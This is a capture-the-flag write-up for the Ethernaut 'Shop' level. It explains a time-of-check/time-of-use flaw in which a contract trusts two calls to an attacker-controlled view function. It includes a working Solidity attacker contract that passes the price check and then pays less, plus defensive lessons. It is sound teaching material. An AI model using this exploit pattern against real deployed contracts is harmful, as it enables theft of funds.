# Ethernaut #21 — Shop
**Pattern:** TOCTOU (Time-Of-Check-Time-Of-Use) via untrusted external `view` call

## Vulnerability
`buy()` calls `price()` on the attacker-supplied `Buyer` twice — once to check against `buyPrice` before `isSold` is set, once after — and trusts both calls return the same value. `view` only guarantees no state write; it doesn't guarantee idempotency.

## Exploit
```solidity
contract attack {
    uint256 price1 = 100;
    uint256 price2 = 80;
    Shop target;
    constructor(Shop _target) { target = _target; }

    function price() external view returns (uint256) {
        if (!target.isSold()) {
            return price1;  // 1st call: isSold still false, passes require
        } else {
            return price2;  // 2nd call: isSold now true, gets stored
        }
    }
    function attackContract() public { target.buy(); }
}
```
`price()` reads `target.isSold()` (a legal `view` read) and branches on it — deterministic, since `isSold` genuinely flips between Shop's two calls.

## Lesson
- `view` ≠ idempotent. Never call the same external `view` getter twice and assume identical results — cache the first result and reuse it.
- Any TOCTOU (Time-Of-Check-Time-Of-Use) pattern — check with one call, act with a second — is exploitable if the external contract isn't trusted/immutable.
- Failed approach #1: a `bool fraud` state variable flipped inside `price()` to alternate return values — doesn't compile, since `view` blocks any state write, even a trivial `bool` flip.
- Failed approach #2: `gasleft() % 2` parity check — technically legal in `view`, but non-deterministic (depends on optimizer/gas costs between calls). Don't rely on it.
